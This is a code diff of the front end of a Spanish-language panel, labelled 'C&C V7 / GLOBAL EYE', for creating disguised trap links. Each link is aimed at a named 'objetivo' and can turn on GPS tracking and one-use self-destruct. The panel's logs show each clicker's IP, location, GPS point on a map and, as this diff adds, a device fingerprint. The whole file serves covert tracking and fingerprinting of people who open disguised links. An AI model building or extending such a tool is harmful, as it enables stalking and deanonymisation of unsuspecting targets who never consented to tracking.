@@ -5,10 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C&C V6 Security</title>
+    <title>C&C V7</title>
     
     <script>
-        // Si no hay llave en la memoria RAM del navegador, te expulsa al login
         if (!sessionStorage.getItem("secure_token")) {
             window.location.href = "/logout";
         }
@@ -20,10 +19,7 @@
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <style>
-        :root {
-            --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff;
-            --text-sec: #8b8b93; --danger: #ff4757; 
-        }
+        :root { --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff; --text-sec: #8b8b93; --danger: #ff4757; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
         
@@ -63,7 +59,9 @@
         
         .log-map-btn { color: #000; font-size: 11px; font-weight: 800; text-decoration: none; display: inline-flex; align-items: center; gap: 4px; margin-top: 6px; background: #fbce49; padding: 4px 10px; border-radius: 6px; cursor: pointer; box-shadow: 0 0 10px rgba(251, 206, 73, 0.3); transition: 0.2s; }
         
-        .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
+        .log-tech { font-size: 10px; color: var(--accent); margin-top: 6px; font-family: monospace; border: 1px solid #333; padding: 6px; border-radius: 6px; background: #000; display: block; width: 100%; }
+
+        .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
         .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 34px; }
@@ -73,33 +71,38 @@
 
         .swal2-popup { background: #1e1e24 !important; color: white !important; border-radius: 20px !important; border: 1px solid #333; }
         .swal2-title { color: white !important; font-size: 18px !important; }
+        .swal2-content { color: #aaa !important; }
+        .swal2-confirm { background: var(--accent) !important; color: black !important; border-radius: 10px !important; font-weight: bold !important; }
+        .swal2-cancel { background: #333 !important; color: white !important; border-radius: 10px !important; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>GLOBAL EYE <span style="color:var(--accent)">V6</span></h1>
-        <div class="status-badge"><div class="dot"></div> SECURE</div>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V7</span></h1>
+        <a href="/logout" style="text-decoration:none;"><div class="status-badge" style="background:rgba(255, 71, 87, 0.1); color:#ff4757; border-color:rgba(255, 71, 87, 0.3);"><span class="material-icons-round" style="font-size:14px;">logout</span> SALIR</div></a>
     </div>
 
     <div class="content-area">
         
         <div id="view-home" class="view active">
             <div class="card">
-                <label class="label">LINK REAL (TIKTOK/YOUTUBE)</label>
-                <input type="text" id="urlDestino" placeholder="Pega el enlace aquí...">
+                <label class="label">LINK REAL</label>
+                <input type="text" id="urlDestino" placeholder="https://...">
                 <div style="height:15px"></div>
-                <label class="label">NOMBRE REFERENCIA</label>
+                <label class="label">REFERENCIA</label>
                 <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
                 
                 <div style="height:20px"></div>
                 
                 <div class="row-switch">
-                    <span style="font-size:13px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
-                    <label class="switch">
-                        <input type="checkbox" id="checkGPS">
-                        <span class="slider round"></span>
-                    </label>
+                    <span style="font-size:12px; font-weight:600;">🛰️ MODO SATÉLITE (GPS)</span>
+                    <label class="switch"><input type="checkbox" id="checkGPS"><span class="slider round"></span></label>
+                </div>
+                
+                <div class="row-switch">
+                    <span style="font-size:12px; font-weight:600;">💥 AUTODESTRUCCIÓN (1 USO)</span>
+                    <label class="switch"><input type="checkbox" id="checkBurn"><span class="slider round"></span></label>
                 </div>
 
                 <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:11px; color:var(--text-sec); margin-bottom:15px; cursor:pointer; text-decoration:underline;">⚙️ Personalizar Disfraz</div>
@@ -139,15 +142,9 @@
     </div>
 
     <div class="nav-bar">
-        <div class="nav-item active" onclick="cambiarVista('home', this)">
-            <span class="material-icons-round">add_circle</span>Crear
-        </div>
-        <div class="nav-item" onclick="cambiarVista('logs', this)">
-            <span class="material-icons-round">list_alt</span>Lista
-        </div>
-        <div class="nav-item" onclick="cambiarVista('map', this)">
-            <span class="material-icons-round">public</span>Mapa
-        </div>
+        <div class="nav-item active" onclick="cambiarVista('home', this)"><span class="material-icons-round">add_circle</span>Crear</div>
+        <div class="nav-item" onclick="cambiarVista('logs', this)"><span class="material-icons-round">list_alt</span>Lista</div>
+        <div class="nav-item" onclick="cambiarVista('map', this)"><span class="material-icons-round">public</span>Mapa</div>
     </div>
 
     <script>
@@ -181,10 +178,8 @@
         function focalizarObjetivo(lat, lon) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            
             document.getElementById('view-map').classList.add('active');
             document.querySelectorAll('.nav-item')[2].classList.add('active');
-
             setTimeout(() => {
                 initMap();
                 map.invalidateSize(); 
@@ -214,6 +209,7 @@
                 nombre: document.getElementById('nombreTrampa').value || "Link",
                 url_destino: document.getElementById('urlDestino').value,
                 usar_gps: document.getElementById('checkGPS').checked,
+                one_time: document.getElementById('checkBurn').checked,
                 meta_titulo: document.getElementById('metaTitulo').value,
                 meta_desc: document.getElementById('metaDesc').value
             };
@@ -274,6 +270,12 @@
                         </div>`;
                     }
 
+                    // MOSTRAR RAYOS X
+                    let fingerprintHTML = "";
+                    if(log.fingerprint) {
+                        fingerprintHTML = `<div class="log-tech">${log.fingerprint}</div>`;
+                    }
+
                     html += `
                     <div class="log-item">
                         <div class="log-icon"><span class="material-icons-round">${icon}</span></div>
@@ -281,6 +283,7 @@
                             <div class="log-title">${log.ubicacion} ${gpsIcon}</div>
                             <div class="log-meta" style="color:var(--text-sec)">${log.ip}</div>
                             <div class="log-meta">🕒 ${log.hora} • 🎯 ${log.trampa}</div>
+                            ${fingerprintHTML}
                             ${gpsBtn}
                         </div>
                     </div>`;
